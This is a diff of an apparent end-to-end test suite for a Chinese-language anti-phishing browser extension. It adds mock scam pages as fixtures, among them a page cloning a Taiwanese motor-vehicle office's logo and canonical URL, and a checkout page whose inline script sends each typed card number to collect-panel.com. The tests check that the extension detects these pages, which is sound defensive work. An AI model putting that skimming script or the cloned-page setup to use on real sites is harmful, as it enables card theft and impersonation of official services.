@@ -45,6 +45,26 @@ PAGES['stock-master.net'] = `<!doctype html><html><head><meta charset="utf-8"><t
   <main><h1>名師帶單 保證獲利</h1><p>穩賺不賠，每天推薦飆股！</p><a href="https://line.me/R/ti/p/@stockteacher">立即加入 LINE 好友領取</a></main></body></html>`;
 PAGES['health-update.net'] = `<!doctype html><html><head><meta charset="utf-8"><title>健保署 健保快易通 APP 更新</title>${style}</head><body><header>衛生福利部中央健康保險署</header>
   <main><h1>健保署 APP 更新</h1><p>請下載最新版本以領取退費。</p><a href="/download/nhi.apk">下載 APP</a></main></body></html>`;
+// 第六版：仿冒繳款網頁的新防線
+// 抄襲官網：原始碼留著監理服務網的正式網址、直接載入官網 Logo；頁面文字沒有任何機構名稱
+PAGES['pay-online-tw.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>線上繳費</title><link rel="canonical" href="https://www.mvdis.gov.tw/m3-emv-trn/">${style}</head><body>
+  <header><img class="logo" src="https://www.mvdis.gov.tw/m3/images/logo.png" alt="" width="160" height="30"></header><main><h1>線上繳費</h1><p>請輸入繳費資料</p>
+  <label for="c">信用卡卡號</label><input id="c"></main></body></html>`;
+// 偷傳卡號：一邊打字一邊把卡號傳給另一個網站（詐騙套件常見做法）
+PAGES['order-confirm-page.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>訂單確認</title>${style}</head><body><header>訂單確認</header>
+  <main><p>請輸入付款資訊完成訂單。</p><label for="cn">卡號</label><input id="cn"><button id="b">送出</button></main>
+  <script>document.getElementById('cn').addEventListener('input',(e)=>{fetch('https://collect-panel.com/api/k',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({k:e.target.value})}).catch(()=>{});});</script></body></html>`;
+// 送出前確認：一般網站（不在官方清單）送出卡號前先確認一次；確認後照常送出
+PAGES['handmade-goods.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>結帳 - 手作好物</title>${style}</head><body><header>手作好物</header>
+  <main><form id="f"><label for="card">信用卡卡號</label><input id="card"><button id="pay" type="submit">確認付款</button></form></main>
+  <script>document.getElementById('f').addEventListener('submit',(e)=>{e.preventDefault();fetch('/api/pay',{method:'POST',body:JSON.stringify({c:document.getElementById('card').value})}).then(()=>{document.title='PAID';});});</script></body></html>`;
+// 正規金流：刷卡欄位放在 TapPay 的 iframe 裡
+PAGES['gateway-shop.com'] = `<!doctype html><html><head><meta charset="utf-8"><title>結帳</title>${style}</head><body><header>結帳</header>
+  <main><p>信用卡付款</p><iframe src="https://js.tappaysdk.com/fields/card.html" width="300" height="40"></iframe></main></body></html>`;
+// 模擬 RDAP：tw-parking-pay.com 5 天前才註冊
+const FIVE_DAYS_AGO = new Date(Date.now() - 5 * 86400000 - 3600000).toISOString();
+const rdapRequests = [];
+
 // 模擬 Gmail 的開信畫面（沿用 Gmail 的 class 名稱；內容是使用者實際收到的詐騙信，已移除追蹤代碼）
 const gmail = (subject, fromName, fromAddr, bodyHtml) => `<!doctype html><html><head><meta charset="utf-8"><title>Gmail</title></head><body>
   <div role="main"><h2 class="hP">${subject}</h2><div class="adn"><span class="gD" email="${fromAddr}" name="${fromName}">${fromName}</span>
@@ -78,6 +98,13 @@ await context.route('**/*', (route) => {
   const u = new URL(route.request().url());
   requestedHosts.add(u.hostname);
   if (!/^https?:$/.test(u.protocol)) return route.continue();
+  if (u.hostname === 'rdap.org') {
+    rdapRequests.push(u.pathname);
+    if (u.pathname === '/domain/tw-parking-pay.com') {
+      return route.fulfill({ status: 200, contentType: 'application/rdap+json', body: JSON.stringify({ ldhName: 'tw-parking-pay.com', events: [{ eventAction: 'registration', eventDate: FIVE_DAYS_AGO }] }) });
+    }
+    return route.fulfill({ status: 404, contentType: 'application/rdap+json', body: '{}' });
+  }
   if (u.hostname === 'judylin0324.github.io' && u.pathname.endsWith('/official-sites.json')) {
     return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(remoteOfficial) });
   }
@@ -110,6 +137,36 @@ const waitUrl = async (p, re, ms = 8000) => {
   while (Date.now() < end && !re.test(p.url())) await settle(200);
 };
 
+// 警告畫面放在封閉的 Shadow DOM 裡（網頁程式碰不到），測試透過 Chrome 開發者協定讀取與點擊
+const attrOf = (n, k) => { const a = n.attributes || []; for (let i = 0; i < a.length; i += 2) if (a[i] === k) return a[i + 1]; return null; };
+function findNode(node, pred) {
+  if (pred(node)) return node;
+  for (const c of [...(node.children || []), ...(node.shadowRoots || [])]) { const r = findNode(c, pred); if (r) return r; }
+  return null;
+}
+async function uiFind(p, value) {
+  const cdp = await context.newCDPSession(p);
+  const { root } = await cdp.send('DOM.getDocument', { depth: -1, pierce: true });
+  const n = findNode(root, (x) => attrOf(x, 'data-oug') === value);
+  if (!n) { await cdp.detach(); return null; }
+  return { cdp, n };
+}
+async function uiText(p, value) {
+  const r = await uiFind(p, value);
+  if (!r) return null;
+  const { outerHTML } = await r.cdp.send('DOM.getOuterHTML', { nodeId: r.n.nodeId });
+  await r.cdp.detach();
+  return outerHTML.replace(/<style[\s\S]*?<\/style>/g, '').replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ');
+}
+async function uiClick(p, value) {
+  const r = await uiFind(p, value);
+  if (!r) return false;
+  const { object } = await r.cdp.send('DOM.resolveNode', { nodeId: r.n.nodeId });
+  await r.cdp.send('Runtime.callFunctionOn', { objectId: object.objectId, functionDeclaration: 'function () { this.click(); }' });
+  await r.cdp.detach();
+  return true;
+}
+
 // 1. 仿冒網址：連線前攔截
 await page.goto('https://ctbc-bank.top/login').catch(() => {});
 await waitUrl(page, /warning\.html/);
@@ -123,7 +180,38 @@ await settle();
 const v2 = await verdictOf(page);
 check('假停車費頁（自稱停管處＋信用卡欄位）判為危險', v2?.level === 'danger', v2?.reasons?.[0]?.text);
 check('假停車費頁顯示全頁警告', await overlayVisible(page));
+const ov2 = (await uiText(page, 'page-overlay')) || '';
+check('全頁警告列出停車費的正確繳費管道', ov2.includes('停車費：請改用這些正確管道') && ov2.includes('ebill.ba.org.tw'), ov2.slice(0, 120));
+check('小額誘餌：指出 120 元是為了讓你不設防', (v2?.reasons || []).some((r) => /120 元這種小額/.test(r.text)));
 await page.screenshot({ path: path.join(SHOTS, '2-parking-overlay.png') });
+// 一鍵查網站註冊多久（按了才查，只送網域名稱）
+check('沒按之前不會自動查註冊日期', rdapRequests.length === 0, rdapRequests.join(','));
+await uiClick(page, 'age');
+await settle(1500);
+const ov2b = (await uiText(page, 'page-overlay')) || '';
+check('按「查註冊日期」顯示才註冊 5 天', /才 5 天/.test(ov2b) && rdapRequests.includes('/domain/tw-parking-pay.com'), ov2b.match(/註冊時間.{0,60}/)?.[0]);
+await page.screenshot({ path: path.join(SHOTS, '2b-parking-age.png') });
+// 一鍵通報附截圖：截圖存到下載資料夾，通報內容註明
+await page.bringToFront();
+const [rp2] = await Promise.all([context.waitForEvent('page'), uiClick(page, 'report')]);
+await rp2.waitForLoadState();
+await settle(2500);
+// （Playwright 會把下載的檔案改成隨機檔名，所以檢查下載紀錄與通報內容裡的檔名）
+const dl = await sw.evaluate(async () => (await chrome.downloads.search({ orderBy: ['-startTime'] })).map((d) => ({ by: d.byExtensionId, state: d.state, bytes: d.totalBytes || d.bytesReceived, mime: d.mime })));
+const shot = dl.find((d) => d.by === extId && d.state === 'complete' && d.bytes > 5000);
+check('一鍵通報時自動截圖存證（存到下載資料夾）', Boolean(shot), JSON.stringify(dl[0] || null));
+// 通報網站的說明欄會自動帶入通報內容
+const pr2 = { text: await rp2.inputValue('#d').catch(() => '') };
+check('通報內容註明截圖檔名與網域註冊日期', pr2 && /網頁截圖：已存在下載資料夾（(官網守門員通報截圖|OfficialUrlGuard-report)\/tw-parking-pay\.com-\d{8}-\d{6}\.png）/.test(pr2.text) && /網域註冊日期/.test(pr2.text), pr2 && pr2.text.split('\n').slice(-3).join(' / '));
+// 註冊日期已記住：之後再進這個網站，單看網址就會判為危險（連線前攔截）
+await page.goto('https://tw-parking-pay.com/pay').catch(() => {});
+await waitUrl(page, /warning\.html/);
+check('查到才註冊 5 天後，再進入這個網站會在連線前攔截', page.url().includes('warning.html'), page.url().slice(0, 80));
+// 後面的測試要看網頁內容，所以先清掉
+await sw.evaluate(async () => { await chrome.storage.local.remove('rdapCache'); });
+await settle(300);
+await rp2.close();
+await page.bringToFront();
 
 // 3. 假罰單：轉帳指示（沒有任何輸入欄位）
 await page.goto('https://fine-notice.net/');
@@ -246,6 +334,68 @@ await settle();
 const v13 = await verdictOf(page);
 check('冒名健保署要你下載 APK 判為危險', v13?.level === 'danger', v13?.reasons?.[0]?.text);
 
+// 13b. 抄襲官網：原始碼的 canonical 與 Logo 來自監理服務網，頁面文字卻沒寫機構名稱
+await page.goto('https://pay-online-tw.com/fee');
+await settle();
+const v13b = await verdictOf(page);
+check('抄襲官網的繳費頁（canonical、Logo 來自 mvdis.gov.tw）判為危險', v13b?.level === 'danger' && /複製/.test(v13b?.reasons?.[0]?.text) && v13b?.impersonating?.domain === 'mvdis.gov.tw', v13b?.reasons?.[0]?.text);
+
+// 13c. 偷傳卡號：還沒按送出，卡號就被傳到另一個網站
+await page.goto('https://order-confirm-page.com/');
+await settle();
+const before13c = await verdictOf(page);
+await page.click('#cn');
+await page.keyboard.type('4111 1111 1111 1111', { delay: 20 });
+await settle(2000);
+const v13c = await verdictOf(page);
+check('打字途中卡號被外傳 → 判為危險（之前只是提醒）', before13c?.level !== 'danger' && v13c?.level === 'danger' && v13c.reasons.some((r) => /還沒按送出/.test(r.text) && /collect-panel\.com/.test(r.text)), `${before13c?.level} → ${v13c?.level}：${v13c?.reasons?.[0]?.text}`);
+check('偷傳卡號時跳出全頁警告', Boolean(await uiFind(page, 'page-overlay').then((r) => { if (r) r.cdp.detach(); return r; })));
+await page.screenshot({ path: path.join(SHOTS, '10-exfil-overlay.png') });
+
+// 13d. 送出前最後一道關卡：一般網站送出卡號前先確認；確認後照常送出
+await page.goto('https://handmade-goods.com/checkout');
+await settle();
+await page.click('#card');
+await page.keyboard.type('4111111111111111', { delay: 10 });
+await settle(1500);
+await page.click('#pay');
+await settle(800);
+const guardText = (await uiText(page, 'submit-guard')) || '';
+check('送出卡號前跳出確認畫面，標明收款網站', guardText.includes('handmade-goods.com') && guardText.includes('送出信用卡卡號前'), guardText.slice(0, 80));
+check('確認前沒有送出', (await page.title()) !== 'PAID');
+await page.screenshot({ path: path.join(SHOTS, '11-submit-guard.png') });
+await uiClick(page, 'confirm-submit');
+await settle(1500);
+check('按「我確認網址正確」後照常送出', (await page.title()) === 'PAID', await page.title());
+const v13d = await verdictOf(page);
+check('按下送出後才傳卡號到自己的網站，不算偷傳', v13d?.level !== 'danger' && !v13d?.reasons?.some((r) => /還沒按送出/.test(r.text)), v13d?.level);
+const ok13d = await sw.evaluate(async () => (await chrome.storage.session.get('submitOk')).submitOk || {});
+check('同一網站這次瀏覽不再詢問', Boolean(ok13d['handmade-goods.com']));
+
+// 13e. 正規金流：刷卡欄位在 TapPay 的 iframe 裡
+await page.goto('https://gateway-shop.com/checkout');
+await settle();
+const v13e = await verdictOf(page);
+check('辨識正規金流（TapPay）的刷卡欄位', v13e?.page?.gateway === 'TapPay', JSON.stringify(v13e?.page?.gateway));
+
+// 13f. 彈出視窗：顯示正確繳費管道、查註冊日期
+const parkTab = await context.newPage();
+await parkTab.goto('https://tw-parking-pay.com/pay');
+await settle();
+const parkTabId = await tabIdOf(parkTab);
+const pop2 = await context.newPage();
+await pop2.setViewportSize({ width: 380, height: 640 });
+await pop2.goto(`chrome-extension://${extId}/src/pages/popup.html?tabId=${parkTabId}`);
+await settle(800);
+const popText = await pop2.textContent('#current');
+check('彈出視窗顯示正確繳費管道', popText.includes('停車費：請改用這些正確管道'), popText.slice(0, 60));
+await pop2.click('text=註冊多久？');
+await settle(800);
+check('彈出視窗查註冊日期', (await pop2.textContent('#current')).includes('才 5 天'));
+await pop2.screenshot({ path: path.join(SHOTS, '12-popup-channels.png'), fullPage: true });
+await pop2.close();
+await parkTab.close();
+
 // 14. 右鍵「檢查這個連結」的檢查頁
 const chk = await context.newPage();
 await chk.setViewportSize({ width: 440, height: 680 });
@@ -304,6 +454,7 @@ const mail = await page.evaluate(() => {
 });
 check('Gmail 開啟假国税庁退稅信時顯示警告', mail && mail.level === 'danger', mail && mail.text.slice(0, 80));
 check('警告內容指出官方網址與藏字手法', mail && /nta\.go\.jp/.test(mail.text) && /看不見的字元/.test(mail.text));
+check('信件警告附上正確管道（e-Tax）', mail && /正確管道：e-Tax/.test(mail.text), mail && mail.text.slice(-80));
 await page.screenshot({ path: path.join(SHOTS, '9-gmail-warning.png') });
 // 單看網址 yarlgs.com 看不出問題，但它來自被判定為詐騙的信件，點了也要攔截
 await page.click('a[href^="https://yarlgs.com"]');
